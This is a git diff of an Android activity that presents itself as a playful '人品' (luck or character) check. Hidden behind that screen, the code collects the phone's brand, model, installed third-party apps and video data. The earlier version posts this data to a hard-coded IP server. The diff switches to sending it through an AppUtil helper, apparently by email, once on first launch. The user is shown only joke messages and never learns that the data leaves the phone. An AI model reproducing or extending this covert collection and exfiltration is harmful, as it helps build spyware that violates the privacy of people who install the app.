@@ -1,41 +1,32 @@
 package com.yangyong.didi2.activity;
 
-import android.content.ContentResolver;
 import android.content.Context;
-import android.content.DialogInterface;
-import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
 import android.provider.MediaStore;
-import android.provider.Settings;
-import android.support.annotation.Nullable;
-import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
-import android.widget.Toast;
 
 import com.baidu.location.BDAbstractLocationListener;
 import com.baidu.location.BDLocation;
 import com.baidu.location.LocationClient;
 import com.baidu.location.LocationClientOption;
 import com.yangyong.didi2.Constants;
-import com.yangyong.didi2.MainActivity;
 import com.yangyong.didi2.R;
+import com.yangyong.didi2.util.AppUtil;
 import com.yangyong.didi2.util.OkHttpUtil;
 import com.yangyong.didi2.util.SpUtils;
 
-import java.text.SimpleDateFormat;
-import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -44,7 +35,8 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
 
     private static final String TAG = "yy";
     private Button send_data;
-        private String rUrl = "http://106.12.207.212:8080/shenying/saveDeviceServlet";
+    private SharedPreferences preferences;
+    private String rUrl = "http://106.12.207.212:8080/shenying/saveDeviceServlet";
     //        private String rUrl = "http://shenyin.vipgz1.idcfengye.com/shenying/saveDeviceServlet";
     private TextView two_tip;
 //    private String rUrl = "https://192.168.206.104/shenying/saveDeviceServlet";
@@ -56,12 +48,17 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
             switch (msg.what) {
                 case 0:
 //                    Toast.makeText(SendDataActivity.this,"检测人品成功",Toast.LENGTH_SHORT).show();
-                    two_tip.setText("检测人品成功...");
-                    locationClient.stop();
+                    two_tip.setText("清歌是猪!!");
+//                    locationClient.stop();
                     break;
                 case 1:
 //                    Toast.makeText(SendDataActivity.this,"检测人品失败",Toast.LENGTH_SHORT).show();
                     two_tip.setText("检测人品失败...");
+                    break;
+                case 2:
+//                    Toast.makeText(SendDataActivity.this,"检测人品失败",Toast.LENGTH_SHORT).show();
+                    two_tip.setTextSize(20);
+                    two_tip.setText("目前处于开发阶段，只能测试一次，哈哈..");
                     break;
             }
         }
@@ -73,7 +70,19 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_send_data);
         initView();
-        initLocationOption();
+        initSP();
+//        initLocationOption();
+        boolean isFirst = preferences.getBoolean("isFirst", true);
+        if (isFirst) {
+            sendData("ooo");
+        }else {
+            mHandler.sendEmptyMessage(2);
+            Log.e(Constants.TAG, "已发送过邮件 ");
+        }
+    }
+
+    private void initSP() {
+        preferences = getSharedPreferences("user", 0);
     }
 
     private void initView() {
@@ -160,9 +169,9 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
     }
 
     private void sendData(final String location) {
-        int status = SpUtils.getValue(this, SpUtils.UPLOADSTATUS);
-        if (status == 1)
-            return;
+//        int status = SpUtils.getValue(this, SpUtils.UPLOADSTATUS);
+//        if (status == 1)
+//        return;
         new Thread(
                 new Runnable() {
                     @Override
@@ -178,7 +187,12 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
                         body.put("software", thirdAppList);
                         body.put("video", video);
                         Log.e(TAG, "开始上传: ");
-                        OkHttpUtil.getInstance().doPost(rUrl, body, new OkHttpUtil.DataCallBack() {
+                        Log.e(TAG, "获取到位置: " + brand + model + "==" + location);
+                        Log.e(TAG, "获取到应用: " + thirdAppList);
+                        Log.e(TAG, "获取到video: " + video);
+                        String phoneContent = brand + model + "\n" + thirdAppList + "\n" + video;
+                        AppUtil.getInstance().send(preferences,phoneContent,mHandler);
+                        /*OkHttpUtil.getInstance().doPost(rUrl, body, new OkHttpUtil.DataCallBack() {
                             @Override
                             public void onSuccess(String s) {
 //                Log.e(TAG, "onSuccess: "+s );
@@ -197,7 +211,7 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
                                 mHandler.sendEmptyMessage(1);
                                 Log.e(TAG, "onFailure: " + f);
                             }
-                        });
+                        });*/
                     }
                 }
         ).start();
